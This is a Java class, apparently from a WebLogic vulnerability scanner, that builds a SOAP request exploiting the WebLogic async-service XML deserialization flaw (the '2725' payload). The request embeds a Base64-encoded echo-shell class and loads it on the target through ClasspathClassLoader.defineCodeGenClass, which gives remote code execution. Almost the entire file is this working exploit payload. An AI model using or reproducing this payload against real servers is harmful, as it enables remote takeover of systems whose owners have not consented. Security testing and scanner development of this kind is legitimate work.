package com.gbw.scanner.plugins.scripts.weblogic.payload;

import com.gbw.scanner.plugins.scripts.weblogic.shell.GBWHttpEchoShell12;
import com.gbw.scanner.utils.ClassFiles;
import sun.misc.BASE64Encoder;


public class GBWEventData2725 implements GBWXmlEchoPayload {
    private String echoClass;
    private String className;
    public GBWEventData2725(){
        this.echoClass= new BASE64Encoder().encode(ClassFiles.classAsBytes(GBWHttpEchoShell12.class));
        this.className= GBWHttpEchoShell12.class.getName();
    }
    public String getXml(){
        String ps="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> \n" +
                "<java>\n" +
                "<class><string>org.slf4j.ext.EventData</string>\n" +
                "<void>\n" +
                "<string>\n" +
                "<![CDATA[\n" +
                "\t\t<java>\n" +
                "\t\t\t<void class=\"sun.misc.BASE64Decoder\">\n" +
                "\t\t\t\t<void method=\"decodeBuffer\" id=\"byte_arr\">\t<string>%s</string>\n" +
                "\t\t\t\t</void>\n" +
                "\t\t\t</void>\n" +
                "\t\t\t<void class=\"weblogic.utils.classloaders.ClasspathClassLoader\">\n" +
                "\t\t\t\t<void method=\"defineCodeGenClass\">\n" +
                "\t\t\t\t\t<string>%s</string>\n" +
                "\t\t\t\t\t<object idref=\"byte_arr\"></object>\n" +
                "\t\t\t\t\t<null/>\n" +
                "\t\t\t\t\t</void>\n" +
                "\t\t\t\t</void>\n" +
                "\t\t\t</void>\n" +
                "\t\t</java>\n" +
                "]]>\n" +
                "</string>\n" +
                "</void>\n" +
                "</class>\n" +
                "</java>\n" +
                "</work:WorkContext>\n" +
                "</soapenv:Header>\n" +
                "<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>";
        return String.format(ps,echoClass,className);
    }

    @Override
    public String getName() {
        return "GBWEventData2725";
    }
}
